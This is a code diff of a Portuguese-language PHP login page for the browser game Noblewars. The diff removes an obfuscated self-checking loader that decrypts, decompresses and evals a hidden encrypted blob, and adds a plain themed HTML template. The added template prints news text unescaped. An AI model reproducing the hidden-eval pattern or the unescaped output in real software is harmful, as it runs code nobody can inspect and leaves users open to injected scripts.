@@ -1,24 +1,243 @@
 <?php
-$raymxbf="98b1f3044f61f782af3aadb8106ed7e3";
-$ilfzflrmt="0b0a03525f5204550651530051510807055f06020455035c040850535107550b";
-$skyzhtdcda="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";
-$jwhebz=file_get_contents(__FILE__);
-$plourlxqsq=str_replace($skyzhtdcda,"",$jwhebz);
-if(strpos($plourlxqsq,"ec"."ho")!==false||strpos($plourlxqsq,"pr"."int")!==false||strpos($plourlxqsq,"var_"."dump")!==false||strpos($plourlxqsq,"file_put_"."contents")!==false||strpos($plourlxqsq,"fw"."rite")!==false){die();}
-$wzzgzhpij=str_replace(array($raymxbf,$ilfzflrmt),array("SP_e64f3c38","KP_0f09235f"),$jwhebz);
-$hbpizmx=md5($wzzgzhpij);
-$oybjpnrhr=hex2bin($ilfzflrmt);
-$qpywcjw="";
-$kaszaylz=strlen($hbpizmx);
-for($dmbhve=0;$dmbhve<$kaszaylz;$dmbhve++){
-$qpywcjw.=chr(ord($oybjpnrhr[$dmbhve])^ord($hbpizmx[$dmbhve]));
-}
-$wzvaeaba=base64_decode($skyzhtdcda);
-$exvvvqetw=strlen($wzvaeaba);
-$ebtkwzhecd="";
-$syapqfwfw=strlen($qpywcjw);
-for($dmbhve=0;$dmbhve<$exvvvqetw;$dmbhve++){
-$ebtkwzhecd.=$wzvaeaba[$dmbhve]^$qpywcjw[$dmbhve%$syapqfwfw];
-}
-$yssdxx="gzun"."compress";
-eval('?>' . $yssdxx($ebtkwzhecd) . '<?php ');
+/**
+ * TEMA CLÁSSICO - Noblewars
+ * Design original fiel ao jogo.
+ */
+?>
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Noblewars</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" type="text/css" href="css/index.css" />
+    <link rel="shortcut icon" href="graphic/icons/nwfavicon.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=MedievalSharp&display=swap" rel="stylesheet">
+    <style>
+        /* Estilo Medieval Puro CSS */
+        .login-block {
+            float: right !important;
+            position: relative !important;
+            top: auto !important;
+            right: 10px !important;
+            margin: -290px 0 0 0 !important;
+            background-color: #f4e4bc;
+            background-image:
+                radial-gradient(circle at center, rgba(255, 255, 255, 0.4) 0%, rgba(255, 255, 255, 0) 70%),
+                url("data:image/svg+xml,%3Csvg width='200' height='200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.1'/%3E%3C/svg%3E");
+            border: 1px solid #c2b280;
+            border-radius: 5px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2), inset 0 0 30px rgba(160, 82, 45, 0.15), inset 0 0 5px rgba(160, 82, 45, 0.3);
+            padding: 20px 25px !important;
+            width: 249px !important;
+            height: auto !important;
+            min-height: 350px;
+            color: #3e2723;
+            font-family: 'MedievalSharp', cursive;
+            z-index: 10;
+            display: block !important;
+        }
+
+        .login-block h2 {
+            color: #2d1b10 !important;
+            font-family: 'MedievalSharp', cursive;
+            font-size: 36px !important;
+            border-bottom: 2px solid #8c5f0d;
+            padding-bottom: 5px;
+            margin: 0 auto 20px auto !important;
+            text-align: center !important;
+            text-shadow: 1px 1px 0 rgba(255, 255, 255, 0.5);
+            width: 100%;
+        }
+
+        .medieval-button {
+            display: block; width: 100%; height: 46px; line-height: 46px;
+            background: linear-gradient(to bottom, #8b5a2b 0%, #6d4c41 50%, #5d4037 100%);
+            border: 2px solid #3e2723; border-radius: 4px;
+            color: #f5f5dc !important; font-family: 'MedievalSharp', cursive; font-size: 22px;
+            text-align: center; text-decoration: none !important; text-shadow: 1px 1px 2px #000;
+            cursor: pointer; position: relative;
+        }
+
+        .medieval-button:hover {
+            background: linear-gradient(to bottom, #a16b35 0%, #7e584a 50%, #6d4c41 100%);
+            color: #fff !important; transform: translateY(-1px);
+        }
+
+        .theme-switcher {
+            position: fixed; bottom: 20px; right: 20px; z-index: 1000;
+            background: rgba(0,0,0,0.7); color: white; padding: 10px 15px;
+            border-radius: 30px; cursor: pointer; font-family: sans-serif;
+            font-size: 12px; border: 1px solid #c2b280;
+            transition: all 0.3s;
+        }
+
+        .theme-switcher:hover { background: #8b5a2b; }
+        
+        .medieval-input {
+            background: #f4e4bc; border: 2px solid #7d510f; border-radius: 4px;
+            padding: 8px; font-family: 'MedievalSharp', cursive; color: #5d4037;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.2); outline: none; cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="index_body">
+        <div id="main">
+            <div id="header">
+                <h1>
+                    <a href="index.php" style="background:url(graphic/index/bg-noble2.jpg) no-repeat 100% 0;">
+                        <p style="position: absolute; top: -300px">NobleWars - O jogo de browser</p>
+                    </a>
+                </h1>
+                <div class="navigation">
+                    <div class="navigation-holder">
+                        <div class="navigation-wrapper">
+                            <div id="navigation_span">
+                                <?php
+                                $i = 0;
+                                $lcount = count($linki);
+                                foreach ($linki as $link => $value) {
+                                    $i++;
+                                    echo '<a href="' . $link . '">' . $value . '</a>';
+                                    if ($lcount != $i) echo ' - ';
+                                }
+                                ?>
+                                <span style="float: right; margin-right: 10px;">
+                                    <?php include __DIR__ . '/components/language_selector_public.php'; ?>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <span class="paladin"><img src="graphic/index/bg-ice41.png" alt="" /></span>
+            </div>
+
+            <div id="content">
+                <div class="container-block">
+                    <div class="container-top"></div>
+                    <div class="container">
+                        <div class="info-block">
+                            <h2><?= __('public.index.heading') ?></h2>
+                            <p><?= __('public.index.description') ?></p>
+                            <a class="medieval-button" href="register.php"><?= __('public.index.register_now') ?></a>
+                            <strong style="margin-top: 50px;"><?= __('public.index.screenshots') ?></strong>
+                            <ul class="screenshots clearfix">
+                                <li><a href="#"><img src="graphic/index/tribalwars-map.png" alt="Mapa" /></a></li>
+                                <li><a href="#"><img src="graphic/index/tribalwars-rally-point.png" alt="Praça" /></a></li>
+                                <li class="last"><a href="#"><img src="graphic/index/tribalwars-paladin.png" alt="Paladino" /></a></li>
+                            </ul>
+                            <div style="margin-top: 80px;">
+                                <br><b><?= __('public.index.registered_accounts', ['count' => $players]) ?></b>
+                            </div>
+                            <div class="clear"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="login-block">
+                        <h2><?= __('public.index.login') ?></h2>
+
+                        <?php if ($can_log): ?>
+                            <form action="index.php?action=login" method="post" id="login_form">
+                                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token'] ?? '') ?>">
+                                <div>
+                                    <label for="user">
+                                        <strong><?= __('public.index.username') ?></strong>
+                                        <input id="user" name="user" class="medieval-input" type="text" style="width:100%; box-sizing:border-box;" />
+                                    </label>
+                                    <label for="password" style="margin-top:10px; display:block;">
+                                        <strong><?= __('public.index.password') ?></strong>
+                                        <input id="password" name="password" class="medieval-input" type="password" style="width:100%; box-sizing:border-box;" />
+                                    </label>
+                                </div>
+                                <a href="#" onclick="document.getElementById('login_form').submit(); return false;" class="medieval-button"><?= __('public.index.enter') ?></a>
+                                <div style="text-align: center; margin-top: 15px;">
+                                    <a href="password_recovery.php" style="color: #7d510f; text-decoration: none; font-size: 14px;">
+                                        <?= __('public.index.recover_password') ?>
+                                    </a>
+                                </div>
+                            </form>
+                            <?php if (!empty($error)): ?>
+                                <div class="error-msg"><?= htmlspecialchars($error) ?></div>
+                            <?php endif; ?>
+                        <?php else: ?>
+                            <div id="world_selection">
+                                <p class="pseudo-heading"><?= __('public.index.select_world') ?></p>
+                                <div class="clearfix" style="margin-top:15px; width:100%; max-height:160px; overflow-y:auto; padding-right:5px;">
+                                    <?php if (!empty($user_worlds)): ?>
+                                        <?php foreach ($user_worlds as $world): ?>
+                                            <div style="margin-bottom:10px;">
+                                                <a href="<?= htmlspecialchars(get_world_url($world, 'index.php?action=select_world&csrf_token=' . ($_SESSION['csrf_token'] ?? ''))) ?>" class="medieval-button">
+                                                    <?= __('public.index.world') ?>: <?= htmlspecialchars($world) ?>
+                                                </a>
+                                            </div>
+                                        <?php endforeach; ?>
+                                    <?php endif; ?>
+
+                                    <?php
+                                    $active_worlds_clean = array_map('strval', $active_worlds);
+                                    $user_worlds_clean = array_map('strval', $user_worlds);
+                                    $available_worlds = array_diff($active_worlds_clean, $user_worlds_clean);
+                                    if (!empty($available_worlds)):
+                                    ?>
+                                        <p style="font-size: 14px; margin-bottom: 5px; margin-top: 15px; color: #5d4037; text-align: left; font-family: 'MedievalSharp', cursive;"><strong>Novos Mundos:</strong></p>
+                                        <?php foreach ($available_worlds as $world): ?>
+                                            <div style="margin-bottom:10px;">
+                                                <a href="<?= htmlspecialchars(get_world_url($world, 'index.php?action=select_world&csrf_token=' . ($_SESSION['csrf_token'] ?? ''))) ?>" class="medieval-button" style="background: linear-gradient(to bottom, #4a6b35 0%, #3e582a 50%, #2d4017 100%);">
+                                                    Jogar: <?= htmlspecialchars($world) ?>
+                                                </a>
+                                            </div>
+                                        <?php endforeach; ?>
+                                    <?php endif; ?>
+                                </div>
+                                <a href="index.php?action=logout&csrf_token=<?= htmlspecialchars($_SESSION['csrf_token'] ?? '') ?>" class="logout-link">← <?= __('public.index.enter_as_admin') ?></a>
+                            </div>
+                        <?php endif; ?>
+                        <div class="clear"></div>
+                    </div>
+                    <div class="container-bottom"></div>
+                </div>
+            </div>
+
+            <?php if (count($news) > 0): ?>
+                <div id="footer">
+                    <div class="footer-header"></div>
+                    <div class="footer-holder">
+                        <div>
+                            <?php foreach ($news as $og): ?>
+                                <div class="news-separator"></div>
+                                <strong><?= htmlspecialchars($og['nazwa']) ?></strong>
+                                <div class="-bottom" style="width: 80%">
+                                    <p><?= $og['data'] ?></p>
+                                    <p><?= $og['text'] ?></p>
+                                </div>
+                            <?php endforeach; ?>
+                        </div>
+                    </div>
+                    <div class="footer-bottom"></div>
+                </div>
+            <?php endif; ?>
+
+            <div class="closure">
+                &copy; <?= date('Y') ?> by Ice41 - Nobles Wars
+            </div>
+        </div>
+    </div>
+
+    <!-- Tema controlado pelo administrador -->
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var loginForm = document.getElementById('login_form');
+            if (loginForm) {
+                loginForm.addEventListener('keypress', function (e) {
+                    if (e.key === 'Enter') { loginForm.submit(); }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
